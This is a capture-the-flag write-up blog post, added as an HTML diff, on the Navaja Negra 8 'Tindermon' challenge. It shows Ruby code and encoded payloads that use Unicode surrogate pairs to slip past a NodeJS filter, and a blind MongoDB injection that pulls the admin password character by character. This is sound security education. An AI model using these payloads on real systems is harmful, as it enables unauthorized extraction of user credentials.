@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>[CTF Write-up] nn8ed Tindermon challenge write-up.</title>
+  <meta name="description" content="This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This web challenge has the following statement:">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="/2018/10/08/nn8ed-tindermon-writeup/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Hans Topo Blog" href="/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="_dreadlocked">
+  <meta name="twitter:title" content="[CTF Write-up] nn8ed Tindermon challenge write-up.">
+  <meta name="twitter:description" content="This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This web challenge has the following statement:">
+  
+    <meta name="twitter:creator" content="_dreadlocked">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hans Topo Blog</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/yous/whiteglass">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">[CTF Write-up] nn8ed Tindermon challenge write-up.</h1>
+    
+    <p class="post-meta"><time datetime="2018-10-08T13:00:44+01:00" itemprop="datePublished">Oct 8, 2018</time> •
+  
+    
+    
+      
+        <a href="/categories/ctf/">ctf</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+        <a href="/categories/nn8ed/">nn8ed</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+        <a href="/categories/nodejs/">nodejs</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/bypass/">bypass</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/unicode/">unicode</a>
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>This weekend, Navaja Negra 8 CTF started, organized by <a href="https://www.twitter.com/ka0labs_">ka0labs.org</a>. This web challenge has the following statement:</p>
+
+<p>Get the admin password! There is a WAF and it is NodeJS… Easy peasy!
+<a href="http://tindermon.ka0labs.org/">http://tindermon.ka0labs.org</a></p>
+
+<h3 id="intro">Intro</h3>
+<p>This challenge presents us a classic NodeJS + Express app. Source code of index is:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="c">&lt;!--WebSite Created by the admin pikachu--&gt;</span>
+<span class="nt">&lt;title&gt;</span>Welcome to our Pokemon-Tinder!!!!!<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body</span>  <span class="na">style=</span><span class="s">"background: pink"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span>List of Users Registered in Tindermon<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;br&gt;&lt;br&gt;&lt;img</span>  <span class="na">src=</span><span class="s">"[/avatar/magikarp](http://tindermon.ka0labs.org/avatar/magikarp)"</span>  <span class="na">height=</span><span class="s">"480"</span>  <span class="na">width=</span><span class="s">"290"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span>  <span class="na">src=</span><span class="s">"[/avatar/bulbasaur](http://tindermon.ka0labs.org/avatar/bulbasaur)"</span>  <span class="na">height=</span><span class="s">"480"</span>  <span class="na">width=</span><span class="s">"290"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span>  <span class="na">src=</span><span class="s">"[/avatar/diglet](http://tindermon.ka0labs.org/avatar/diglet)"</span>  <span class="na">height=</span><span class="s">"480"</span>  <span class="na">width=</span><span class="s">"290"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/center&gt;&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Two interesting things here:</p>
+
+<ul>
+  <li>The admin username is pikachu</li>
+  <li>There’s a route /avatar/<code class="highlighter-rouge">username</code> which, when visited, redirects us to /img/<code class="highlighter-rouge">ìd</code>.jpg where id seems to be the user id.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /avatar/magikarp HTTP/1.0
+
+-&gt; 302 Found, Location: /imgs/1.jpg
+</code></pre></div></div>
+
+<h4 id="not-that-easy-theres-a-waf">Not that easy, there’s a “WAF”</h4>
+<p>Testing some characters show us that there’s some kind of check for the following chars:
+<code class="highlighter-rouge">" ' . (space)</code>
+Why those characters and not others like &gt; or &lt;? Because (not-so-obviously) what they are trying to avoid is a NoSQL Injection, probably on a MongoDB database.</p>
+
+<p>So logic seems to be:</p>
+
+<ul>
+  <li>Express router process the request.</li>
+  <li>Controller search for the URL parameter, which is everything following /avatar/ to the next “/” and is intended to be a username.</li>
+  <li>Looks for the username in MongoDB, if exists, returns a 302 redirection to users image path.</li>
+</ul>
+
+<p>Easy right? We are in front a NoSQL Injection challenge like many others, but this time we need to figure out how to bypass NodeJS checks.</p>
+
+<p>Well, at first, some tricks come to my mind, such as Orange Tsai’s 2017 Black Hat presentation about  NodeJS inconsistency on parsing Full-Width Characters: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
+
+<h3 id="reading-a-bit-about-how-javascript-unicode-decoding-standards-works">Reading a bit about how JavaScript Unicode decoding standards works.</h3>
+
+<p>This article give us some keys <a href="https://mathiasbynens.be/notes/javascript-unicode">https://mathiasbynens.be/notes/javascript-unicode</a>. As the article says, for backwards compatibility with ES5 and older standards,  unicode are divided in groups of two, each one of 2 bytes, this are called “surrogate pairs”.</p>
+
+<p>So, for example, the emoji 💩 becomes <code class="highlighter-rouge">\uD83D\uDCA9</code>. How this split is done? The answer is, again, in the same blog: <a href="https://mathiasbynens.be/notes/javascript-encoding">https://mathiasbynens.be/notes/javascript-encoding</a></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">H</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">((</span><span class="nx">C</span> <span class="o">-</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x400</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xD800</span>  
+<span class="nx">L</span> <span class="o">=</span> <span class="p">(</span><span class="nx">C</span> <span class="o">-</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0xDC00</span>
+</code></pre></div></div>
+
+<p>Cool, at this point a hint is released, the hint are some emojis, so it’s clear, we need some Unicode trick to bypass NodeJS checks. But, do not forget, those unicodes needs to make sense for MongoDB, which is the final endpoint of our string.</p>
+
+<h3 id="error-error-error-error-victory">Error, error, error, error, victory!</h3>
+<p>After a lot of testing and a key of my man X-C3LL, seems that MongoDB is reading the least significant byte of each surrogate pair, well, let’s test if this is true using <code class="highlighter-rouge">"||"1"=="1</code> payload,  but remember, we can’t just use <code class="highlighter-rouge">"</code>, so we need to figure out a unicode which contains 0x22 and 0x7C as their least significant bytes of each surrogate pair.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># This receives a string of two characters, and looks for a unicode hex who's surrogate pairs least significant byte, match each character hex representation.</span>
+<span class="k">def</span> <span class="nf">uni</span><span class="p">(</span><span class="n">find</span><span class="p">)</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">0</span><span class="o">...</span><span class="mh">0xFFFFF</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="p">(((</span><span class="n">i</span> <span class="o">-</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x400</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xD800</span><span class="p">).</span><span class="nf">to_i</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="mi">16</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="o">..-</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">chr</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">-</span> <span class="mh">0x10000</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0xDC00</span><span class="p">).</span><span class="nf">to_i</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="mi">16</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="o">..-</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">chr</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">h</span> <span class="o">==</span> <span class="n">find</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">l</span> <span class="o">==</span> <span class="n">find</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+      <span class="k">return</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode</span> <span class="p">[</span><span class="n">i</span><span class="p">.</span><span class="nf">to_i</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'U'</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>A return without the URI encode for the string <code class="highlighter-rouge">"|</code>, the unicode <code class="highlighter-rouge">\u{1887c}</code>  when divided in surrogate pairs:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>H: 0xD822
+L: 0xDC7C
+</code></pre></div></div>
+<p>Their least significant byte’s match with <code class="highlighter-rouge">"</code>and <code class="highlighter-rouge">|</code> respectively.</p>
+
+<p>So we got some restrictions to bypass using this trick, those restrictions are the characters forbidden by backend controller, a bit of code helps me to create strings based on this trick for the restricted characters:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Takes pairs of characters where a forbidden char is and</span>
+<span class="c1"># converts it to unicode representation.</span>
+<span class="k">def</span> <span class="nf">convert_forbidden</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+  <span class="n">final_string</span> <span class="o">=</span> <span class="s2">""</span>
+  <span class="n">skip</span> <span class="o">=</span> <span class="kp">false</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">0</span><span class="o">..</span><span class="n">string</span><span class="p">.</span><span class="nf">length</span><span class="o">-</span><span class="mi">1</span> <span class="k">do</span>
+      <span class="k">if</span> <span class="o">!</span><span class="n">skip</span> <span class="k">then</span>
+        <span class="k">if</span> <span class="vg">$waf</span><span class="p">.</span><span class="nf">include?</span> <span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">then</span>
+          <span class="n">res</span> <span class="o">=</span> <span class="n">uni</span><span class="p">(</span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+          <span class="n">final_string</span> <span class="o">+=</span> <span class="n">res</span>
+          <span class="n">skip</span> <span class="o">=</span> <span class="kp">true</span>
+        <span class="k">else</span>
+          <span class="n">final_string</span> <span class="o">+=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode</span> <span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="k">end</span>
+      <span class="k">else</span>
+        <span class="n">skip</span> <span class="o">=</span> <span class="kp">false</span>
+      <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="k">return</span> <span class="n">final_string</span><span class="p">.</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="s2">"%2F"</span><span class="p">).</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"["</span><span class="p">,</span><span class="s2">"%5B"</span><span class="p">).</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"]"</span><span class="p">,</span><span class="s2">"%5D"</span><span class="p">).</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"&amp;"</span><span class="p">,</span><span class="s2">"%26"</span><span class="p">)</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<p>For the string <code class="highlighter-rouge">"||"1=="1</code> this returns: <code class="highlighter-rouge">%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1</code></p>
+
+<p>Testing on the live application, it works!! <code class="highlighter-rouge">/avatar/%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1</code> returns 1.jpg, the same process but using “1”==”0” instead of “1” ==”1” returns us 404.jpg. So we can confirm the injection.</p>
+
+<h3 id="exploiting-blind-nosql-injection">Exploiting Blind NoSQL Injection</h3>
+<p>Now we need to write a bit more code to exfiltrate data, byte by byte. After some digging and refresh of MongoDB basics, it ended up on this payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pikachu"&amp;&amp;(this.password.match(/^_string_/))=="_string_"||"1"=="0
+</code></pre></div></div>
+
+<p>This will return true only if the string starts with the <em>string</em> value. Look at the script to get more details if you are unfamiliar with Blind techniques.</p>
+
+<h4 id="run-and-gimme-the-flag">Run and gimme the flag!</h4>
+<p>Running the final script starts exfiltrating us the password for the user pikachu, character by character, but we know that flag starts with <code class="highlighter-rouge">nn8ed{</code>, so some work is done:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Found! nn8ed{T
+Found! nn8ed{Th
+Found! nn8ed{Thi
+... (lot of time)
+Found! nn8ed{This.Old.Challenge.With.Unic0de}
+</code></pre></div></div>
+
+<p>So there’s the flag. Super funny challenge, I learned a lot about how NodeJS 8 works with Unicode and how inconsistencies at encoding treatment can compromise a system.</p>
+
+<p>Congratz to ka0labs.org for this great challenge!</p>
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
